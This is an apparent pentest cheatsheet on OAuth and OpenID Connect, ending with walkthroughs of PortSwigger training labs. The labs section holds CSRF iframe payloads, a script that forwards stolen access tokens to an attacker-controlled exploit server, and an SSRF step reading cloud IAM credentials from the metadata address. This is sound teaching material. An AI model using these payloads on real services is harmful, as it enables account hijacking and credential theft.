# OAuth
 OAuth 2.0 was developed to facilitate secure sharing of specific data between applications. It involves interactions between three key parties: a client application, a resource owner, and the OAuth service provider.

- **Client application** : The website or web application that wants to access the user's data. 
- **Resource owner** : The user whose data the client application wants to access. 
- **OAuth serveice provider** : The website or application that controls the user's data and access. It supports OAuth by providing an API for interacting with an authorization server and a resource server.

## OAuth process
OAuth can be implemented in various ways, referred to as OAuth "flows" or "grant types." The most common ones are the "authorization code" and "implicit" grant types. Both of these broadly follow similar stages :

1. The client application requests access to a subset of the user's data, specifying the grant type and type of access.
2. The user logs into the OAuth service and gives explicit consent for the requested access.
3. The client application receives an access token proving it has permission to access the data, with the process varying by grant type.
4. The client application uses the access token to make API calls and retrieve data from the resource server.

## OAuth grant types
Refference : https://portswigger.net/web-security/oauth/grant-types

The OAuth grant type defines the sequence of steps in the OAuth process and determines how the client application communicates with the OAuth service, including how the access token is sent. Grant types are often called **OAuth flows**.

The OAuth service must be configured to support a specific grant type before the client can initiate the flow. The client specifies the desired grant type in the initial authorization request.

There are multiple grant types, each with varying complexity and security. The most common are the **authorization code** and **implicit** grant types.

## OAuth scopes
For any OAuth grant type, the client application must specify the data it wants to access and the operations it intends to perform. This is done using the `scope` parameter in the authorization request sent to the OAuth service.

When requesting read access to a user's contact list, the scope name might take any of the following forms depending on the OAuth service being used: 
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```
When OAuth is used for authentication, however, the standardized OpenID Connect scopes are often used instead. For example, the scope `openid profile` will grant the client application read access to a predefined set of basic information about the user, such as their email address, username, and so on


### Authorization code grant type
The client application and OAuth service first use redirects to exchange a series of browser-based HTTP requests that initiate the flow.

Authorization grant type is the most secure. Server-side applications should ideally always use this grant type if possible. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-authorization-code-flow.jpg)

The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
This request contains the following noteworthy parameters, usually provided in the query string: 
- **client_id** : A required parameter that contains the unique identifier of the client application, generated during registration with the OAuth service.
- **redirect_uri** : The URI to which the userâ€™s browser is redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint" and is often exploited in OAuth attacks due to validation flaws. 
- **response_type** : Indicates the type of response the client expects and the flow it wants to initiate. For the authorization code grant, the value is `code`. 
- **scope** : Specifies which subset of the user's data the client application wants to access, either custom or standardized scopes.
- **state** : Stores a unique value tied to the current session to prevent CSRF attacks. The OAuth service must return this value with the authorization code to ensure the request to the `/callback` endpoint is from the same user who started the flow.

### Implicit grant type
Not first obtaining an authorization code and then exchanging it for an access token, but the client application receives the access token immediately after the user gives their consent. 

It is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-implicit-flow.jpg)

The only major difference is that the `response_type` parameter must be set to `token`.
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## OAuth authentication
OAuth authentication is implemented as follows:
1. The user opts to log in using their social media account, prompting the client application to use the social media site's OAuth service to request data like the user's email address.
2. After obtaining an access token, the client application retrieves this data from the resource server, often from a `/userinfo` endpoint.
3. Once the data is received, the client application uses it to log the user in, replacing a username. The access token often serves as a substitute for a traditional password.

## OpenID Connect *
Refference : https://portswigger.net/web-security/oauth/openid

OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. It adds some simple functionality that enables better support for the authentication use case of OAuth. 

Typically requested read access to some basic user data and, if they were granted this access, assumed that the user authenticated themselves on the side of the OAuth provider. 

OpenID Connect slots neatly into the normal OAuth flows. From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: `id_token`. 

### OpenID Connect roles *
- **Relying party** : The application that is requesting authentication of a user. This is synonymous with the OAuth client application. 
- **End user** : The user who is being authenticated. This is synonymous with the OAuth resource owner.
- **OpenID provider** : An OAuth service that is configured to support OpenID Connect. 

### OpenID Connect claims and scopes
The term `claims"` refers to the key:value pairs that represent information about the user on the resource server. One example of a claim could be `"family_name":"Montoya"`. 

Unlike basic OAuth, whose scopes are unique to each provider, all OpenID Connect services use an identical set of scopes. In order to use OpenID Connect, the client application must specify the scope openid in the authorization request. They can then include one or more of the other standard scopes: 
```
profile
email
address
phone
```
Each of these scopes corresponds to read access for a subset of claims about the user that are defined in the OpenID specification. For example, requesting the scope `openid profile` will grant the client application read access to a series of claims related to the user's identity, such as `family_name`, `given_name`, `birth_date`.

### ID token *
The other main addition provided by OpenID Connect is the `id_token` response type. This returns a JSON web token (JWT) signed with a JSON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested. It also contains information about how and when the user was last authenticated by the OAuth service. The client application can use this to decide whether or not the user has been sufficiently authenticated. 

The main benefit of using `id_token` is the reduced number of requests that need to be sent between the client application and the OAuth service, which could provide better performance overall. Instead of having to get an access token and then request the user data separately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves. 

Rather than simply relying on a trusted channel, as happens in basic OAuth, the integrity of the data transmitted in an ID token is based on a JWT cryptographic signature. For this reason, the use of ID tokens may help protect against some man-in-the-middle attacks. However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on `/.well-known/jwks.json`), some attacks are still possible. 

 Note that multiple response types are supported by OAuth, so it's perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's `id_token` response type:
```
response_type=id_token token
response_type=id_token code
```
In this case, both an ID token and either a code or access token will be sent to the client application at the same time. 


### Identifying OpenID Connect *
The most foolproof way to check is to look for the mandatory openid scope. 

Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the `openid` scope or changing the response type to `id_token` and observing whether this results in an error. 

As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint 
```
/.well-known/openid-configuration
```

#### Unprotected dynamic client registration


#### Allowing authorization requests by reference





## Recon
When using an external OAuth service, the specific provider can be identified by checking the hostname to which the authorization request is sent. Since these services offer a public API, detailed documentation is often available, providing information such as endpoint names and configuration options.  

Once you have the authorization server's hostname, you should send a `GET` request to the following standard endpoints to gather more information:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

## Labs Portswigeer 
e.g.) The main request to play with is ```/auth?client_id=...```  
1. Authentication bypass via OAuth implicit flow
>Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.

2. Forced OAuth profile linking
>Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
```
<iframe src="URL/oauth-linking?code=XXXX"></iframe>
```

3. OAuth account hijacking via redirect_uri
>Intercept the whole process of OAuth authentication and observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`, change redirect_uri to your exploit server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

4. Stealing OAuth access tokens via an open redirect
>4.1 Same as the previous one observe ```/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx```.  
>4.2 On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
>4.3 Write the next URL:  
```
redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/
```  
>This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.  
>4.4 Write final payload:  
```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

5. SSRF via OpenID dynamic client registration

This task involves exploiting an OAuth service by registering a fake client application and using the logo_uri property to make the OAuth server fetch sensitive metadata from an internal URL. Here's the step-by-step process:
>5.1 Log in to your account and access the OAuth server's configuration file at /.well-known/openid-configuration.  
>5.2 Register a new client application by sending a POST request to /reg. Include a redirect_uris array with an arbitrary URL.  
>5.3 Check the OAuth flow using Burp to see that the "Authorize" page fetches the client application's logo from a specific URL.  
>5.4 Modify the registration request to include a logo_uri property.Replace the logo_uri with a URL pointing to sensitive metadata (http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/).    
>5.5 Trigger the logo fetch request by sending a GET request to the logo's endpoint using the new client ID.  
>5.6 Fetch the logo again using the new client ID to retrieve sensitive information, such as the secret access key, from the OAuth provider's cloud environment.  
